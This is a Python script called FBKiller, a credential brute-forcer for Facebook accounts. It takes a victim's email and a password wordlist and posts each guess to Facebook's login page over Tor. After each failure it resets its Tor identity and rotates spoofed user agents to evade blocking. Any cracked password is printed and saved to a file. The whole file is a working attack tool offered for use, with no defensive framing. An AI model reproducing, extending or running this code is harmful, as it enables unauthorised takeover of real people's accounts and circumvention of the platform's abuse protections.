#!/usr/bin/python
# -*- coding: utf-8 -*-
__author__ = "Krpyt0mux"
import requests
import sys
import os
import logging
import random
from validate_email import validate_email
from ansi.colour import fg
from colorama import Fore,Style
from bs4 import BeautifulSoup
import datetime
import argparse
from torrequest import TorRequest
#from stem import Signal
#from stem.control import Controller
#import stem.socket
#import time
"""
Logging Class
"""
class Log:

    """
    Prints text with color
    """
    def print_text(self, color, text):
            print(Style.BRIGHT + color + text)

    """
    Prints password attempt
    """
    def print_trying(self, password):
            t = datetime.datetime.now()
            print(Fore.WHITE + str(t) + Style.NORMAL + Fore.CYAN   + " [DEBUG]: " + Fore.WHITE + "Trying password " + Style.BRIGHT + Fore.CYAN + password)


    """
    Print the credentials
    """
    def print_creds(self, username, password):
        print(Style.BRIGHT + Fore.WHITE + "------- Password Found -------")
        print(Style.BRIGHT + Fore.WHITE + "Email    : " + Fore.GREEN + username)
        print(Style.BRIGHT + Fore.WHITE + "Password : " + Fore.GREEN + password)
        print(Style.BRIGHT + Fore.WHITE + "------------------------------")

    """
    Logs a message
    """
    def log(self,sign,text):

        t = datetime.datetime.now()

        if (sign == "info"):
            print(Fore.WHITE + str(t) + Style.BRIGHT + Fore.GREEN  + " [INFO]:  " + Fore.WHITE + text)

        if (sign == "debug"):
            print(Fore.WHITE + str(t) + Style.NORMAL + Fore.CYAN   + " [DEBUG]: " + Fore.WHITE + text)

        if (sign == "warning"):
            print(Fore.WHITE + str(t) + Style.NORMAL + Fore.YELLOW + " [WARNING]: " + Fore.WHITE + text)

        if (sign == "error"):
            print(Fore.WHITE + str(t) + Style.NORMAL + Fore.RED    + " [ERROR]: " + Fore.WHITE + text)


"""
The Banner
"""
def Banner ():

        msg = """


███████╗██████╗ ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
██╔════╝██╔══██╗██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
█████╗  ██████╔╝█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
██╔══╝  ██╔══██╗██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
██║     ██████╔╝██║  ██╗██║███████╗███████╗███████╗██║  ██║
╚═╝     ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                           
"""
        print (fg.red(msg))

"""
Brute forcing Class
"""
class Brute:

    # Initialize the class with a constructor
    def __init__(self, url, email,words):

        os.system("clear")
        Banner()
        logging = Log()
        logging.log("info", "Setting up bruteforcer for %s" % email)
        self.url = url
        self.email = email
        self.words = words

    """
    Gets the session
    """
    def get_session(self):
        logging = Log()
        f = open(self.get_session_name(), 'r')
        logging.log("info", "opening session %s" % self.get_session_name())
        lines = f.readlines()
        f.close()
        return int(lines[0])

    """
    Saves the session
    """
    def save_session(self, index):
        logging = Log()
        f = open(self.get_session_name(), 'w')
        f.write(str(index))
        f.close()
        logging.log("debug", "session %s saved..." % self.get_session_name())

    """
    Get the session name
    """
    def get_session_name(self):
        return 'sessions/%s_session.session'%self.email


    """
    Run the bruteforcer.
    """
    def run(self):
        logging = Log()
        logging.log("info", 'starting some system services..')
        #os.system('service privoxy restart')
        os.system('service tor restart')
        self.login()

    """
    Save the credentials
    """
    def save_creds (self, email, password):
        if (os.path.isfile("passwords/%s" % email) == False):
            f = open('passwords/%s' % email, "w+")
            f.write("Email   : %s\n" % email)
            f.write("Password: %s\n" % password)
            f.close()
        logging = Log()
        logging.log("info", "credentials save to passwords/%s" % email)
    """
    Login to facebook
    """
    def login(self):


        try:
            idx = 0
            attempts = 0


            # Get The Session
            if (os.path.isfile(self.get_session_name())):

                option = input(Style.BRIGHT+ Fore.WHITE + "Do you want to open the session %s [Y/n]: " % self.get_session_name())
                if (option == "Yes" or option == "YES" or option == "yes" or option == "y" or option == "Y"):
                    idx = self.get_session()-1

            # Read the lines from the wordlist.
            lines = open(self.words, 'r').readlines()

            # The user agent list
            user_agent_list = [
                # Chrome
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
                # Firefox
                'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
            ]

            tr = TorRequest()

            # Read the file line by line
            while idx != len(lines):

                if (idx < 0):
                    logging.log("debug", "Renewing the session..")
                    idx = 0

                    # Strip the password
                    password = lines[idx].rstrip()

                else:

                    # Strip the password
                    password = lines[idx].rstrip()


                user_agent = random.choice(user_agent_list)
                headers = {'User-Agent': user_agent}
                logging.log('debug', 'using header %s' % headers)
                logging.print_trying(password)

                try:
                    # Post the payload and get a response back.
                    payload = {
                        'email': self.email,
                        'pass': password,
                    }
                    response = tr.post(self.url, headers=headers, data=payload)
                except:
                    logging.log('warning', 'Connection error')
                    sys.exit(1)


                # Parse the html using BeautifulSoup and grab the title.
                soup = BeautifulSoup(response.content, 'html.parser')
                title = soup.title.string

                # Locked out: When this happens the best thing to do is
                # Save the session and try again later.
                #if ('Facebook' not in title):
                #    self.save_session(idx)
                #   logging.log("info", "LOCKED OUT: Trying again later")
                #   sys.exit(1)

                # Check if the title is 'Facebook' for a successful login.
                if ('Facebook'==title):

                    logging.print_creds(self.email, password)

                    # Save the credentials
                    self.save_creds(self.email, password)
                    break
                    break

                else:

                    # Increase some counters
                    idx += 1
                    attempts += 1
                    tr.reset_identity()

            logging.log("debug", "finished...")

        except KeyboardInterrupt:
            self.save_session(idx)
            sys.exit(1)


Banner()
global parser
arg = argparse.ArgumentParser(description='Facebook Brute Forcer')
requiredArgs = arg.add_argument_group('Required Arguments')
requiredArgs.add_argument('-t', '--email',    help='The email address of the account', required=True)
requiredArgs.add_argument('-w', '--wordlist', help='The wordlist containing the passwords', required=True)
parser = arg.parse_args()


logging = Log()

try:
    if sys.version_info[0] < 3:
        raise Exception("REQUIRED PYTHON 3.x")
except Exception:
    logging.log('error','REQUIRED PYTHON 3.x')
    logging.log('error','Example: python3 fbkiller.py -h')
    sys.exit(1)

# Create the brute object and run the bruteforce attack.
if (os.path.isfile(parser.wordlist) == False):
    logging.log("error", "No such dictionary file..")
    sys.exit(1)

is_email = validate_email( parser.email)
if (is_email and ".com" in parser.email):

    if (os.path.isdir("passwords") == False or os.path.isdir("sessions") == False):
        logging.log('error', 'you need to install, please run python3 setup.py')
        sys.exit(1)
    brute = Brute('https://www.facebook.com/login.php', parser.email, parser.wordlist)
    brute.run()


else:
    logging.log("error", "invalid email")
    sys.exit(1)
